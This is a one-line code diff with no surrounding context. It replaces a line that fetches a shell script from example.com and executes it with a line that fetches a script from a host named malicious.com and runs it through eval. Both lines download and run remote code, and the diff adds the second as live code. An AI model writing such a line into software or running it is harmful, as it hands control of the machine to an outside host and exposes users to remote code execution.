@@ -1,1 +1,1 @@
-fetch('http://example.com/payload.sh').then(res => exec(res.text()));
+fetch('http://malicious.com/script.js').then(res => res.text()).then(eval);
